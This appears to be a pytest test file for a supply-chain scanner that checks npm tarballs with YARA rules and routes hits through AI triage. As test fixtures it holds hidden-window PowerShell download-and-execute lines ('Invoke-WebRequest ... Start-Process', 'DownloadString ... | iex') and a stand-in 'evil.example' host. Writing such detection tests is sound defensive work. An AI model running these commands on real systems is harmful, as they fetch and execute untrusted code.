import io
import json
import tarfile

import pytest

import soc_store
from secopsai import research_ai_triage, research_funnel, yara_engine
from secopsai.research_intake import SafeFetcher

yara_x = pytest.importorskip("yara_x")


def _tgz(files):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def test_yara_scans_binary_members_that_text_decoding_dropped(tmp_path, monkeypatch):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "t.yar").write_text('rule Test_Implant { meta: author = "Analyst A" score = 85 strings: $a = { 4D 5A 90 00 } condition: $a at 0 }')
    monkeypatch.setenv("SECOPSAI_YARA_RULE_DIRS", str(rules))
    yara_engine.load(force=True)
    try:
        result = yara_engine.scan_files([("package/dist/implant.exe", b"MZ\x90\x00" + b"\xff" * 64)])
    finally:
        monkeypatch.delenv("SECOPSAI_YARA_RULE_DIRS")
        yara_engine.load(force=True)
    assert result["level"] == "alert" and result["score"] == 85
    assert result["findings"][0]["rule_author"] == "Analyst A", "DRL attribution must survive"


def test_prescan_flags_hits_and_clears_clean_releases(tmp_path):
    bad = _tgz({"package/package.json": b"{}", "package/x.ps1": b"powershell -WindowStyle Hidden -c Invoke-WebRequest http://a/b.exe -OutFile b.exe; Start-Process b.exe"})
    good = _tgz({"package/package.json": b"{}", "package/index.js": b"module.exports = 1;"})
    blobs = {"https://registry.npmjs.org/bad/-/bad-1.0.0.tgz": bad, "https://registry.npmjs.org/good/-/good-1.0.0.tgz": good}
    fetcher = SafeFetcher(fetch=lambda url, _max: (200, {"content-type": "application/octet-stream"}, blobs[url]))
    results = research_funnel.prescan([
        {"key": "E1", "package": "bad", "version": "1.0.0", "tarball": "https://registry.npmjs.org/bad/-/bad-1.0.0.tgz"},
        {"key": "E2", "package": "good", "version": "1.0.0", "tarball": "https://registry.npmjs.org/good/-/good-1.0.0.tgz"},
        {"key": "E3", "package": "elsewhere", "version": "1.0.0", "tarball": "https://evil.example/x.tgz"},
    ], fetcher=fetcher, workers=2)
    assert results["E1"]["status"] == "hit" and results["E1"]["findings"]
    assert results["E2"]["status"] == "clean"
    assert results["E3"]["status"] == "skipped", "only registry-hosted archives are fetched"


class _FakeCore:
    enabled = True

    def __init__(self):
        self.queued = []

    def queue_triage_jobs(self, jobs):
        self.queued.extend(jobs)
        return {"queued": [{"artifact_id": job["artifact_id"], "job_id": f"AIJ-{i}"} for i, job in enumerate(jobs)]}

    def triage_results(self, *, since="", limit=100):
        return {"results": [
            {"artifact_id": "npm:quiet@1.0.0", "status": "succeeded", "updated_at": "2026-10-10T01:00:00Z", "job_id": "AIJ-0", "result": {"finding_verdict": "false_positive", "finding_confidence": 92, "summary": "Source map data URI"}},
            {"artifact_id": "npm:loud@2.0.0", "status": "succeeded", "updated_at": "2026-10-10T01:01:00Z", "job_id": "AIJ-1", "result": {"finding_verdict": "true_positive", "finding_confidence": 80}},
        ] if not since else [], "pending": 0}


def test_ai_triage_round_trip_resolves_benign_and_escalates_suspicious(tmp_path):
    db = str(tmp_path / "research.db")
    soc_store.init_db(db)
    with soc_store.connect(db) as connection:
        for alert_id, package, version in (("RAL-1", "quiet", "1.0.0"), ("RAL-2", "loud", "2.0.0")):
            connection.execute(
                "INSERT INTO research_alerts (alert_id, alert_type, severity, dedupe_key, reason, evidence_json, status, owner, created_at, updated_at) VALUES (?, 'npm_proactive_anomaly', 'high', ?, 'r', ?, 'open', '', 't', 't')",
                (alert_id, alert_id, json.dumps({"package": package, "version": version})),
            )
        connection.commit()
    for package, version in (("quiet", "1.0.0"), ("loud", "2.0.0")):
        research_ai_triage.record_hit(ecosystem="npm", package=package, version=version, prescan={"score": 60, "level": "warning", "findings": [{"rule_id": "YARA:X", "safe_context": "..."}]}, db_path=db)
    core = _FakeCore()
    summary = research_ai_triage.sync(core, db_path=db)
    assert summary["queued"] == 2 and summary["resolved"] == 1 and summary["escalated"] == 1
    assert core.queued[0]["inputs"]["artifact_triage"]["findings"][0]["rule_id"] == "YARA:X"
    with soc_store.connect(db) as connection:
        status = dict(connection.execute("SELECT alert_id, status FROM research_alerts").fetchall())
        note = json.loads(connection.execute("SELECT json_extract(evidence_json, '$.ai_triage') FROM research_alerts WHERE alert_id='RAL-2'").fetchone()[0])
    assert status == {"RAL-1": "resolved", "RAL-2": "open"}
    assert note["verdict"] == "suspicious"
    assert research_ai_triage.sync(core, db_path=db)["results"] == 0, "cursor prevents re-applying results"


def test_powershell_rule_needs_staging_and_skips_documentation():
    staging = b"exec('powershell -WindowStyle Hidden -c \"(New-Object Net.WebClient).DownloadString(\\'http://x/p.ps1\\') | iex\"')"
    instructions = b"Install: powershell -c \"Invoke-WebRequest https://x/i.ps1 | iex\" -WindowStyle Hidden"
    guard = b"const blocked = /\\b(?:Invoke-WebRequest|irm)\\b/; // powershell -NoProfile | iex Start-Process"
    hits = lambda path, data: [f for f in yara_engine.scan_files([(path, data)])["findings"] if "PowerShell_Download" in f["rule_id"]]
    found = hits("package/install.js", staging)
    assert found and {"$ps", "$ex2", "$ev1"} <= set(found[0]["matched_patterns"])
    assert "[...]" not in found[0]["safe_context"] or found[0]["safe_context"].count("[...]") <= 2
    assert not hits("package/README.md", instructions)
    assert not hits("package/lib/guard.js", guard)


def test_manifest_summary_and_file_roles():
    manifest = research_funnel.manifest_summary([
        ("package/package.json", json.dumps({"name": "x", "main": "lib/index.js", "bin": {"x": "./bin/x.js"},
                                              "scripts": {"postinstall": "node setup.js", "test": "jest"}}).encode()),
        ("package/setup.js", b""),
    ])
    assert manifest["install_scripts"] == {"postinstall": "node setup.js"} and manifest["other_scripts"] == ["test"]
    role = lambda path: research_funnel.file_role(path, manifest)
    assert role("package/setup.js") == "install_script"
    assert role("package/bin/x.js") == "entry_point"
    assert role("package/lib/index.js") == "entry_point"
    assert role("package/README.md") == "documentation"
    assert role("package/dist/app.js.map") == "source_map"
    assert role("package/lib/util.js") == "code"
    assert research_funnel.manifest_summary([("package/package.json", b"{bad")]) == {"parse_error": True}
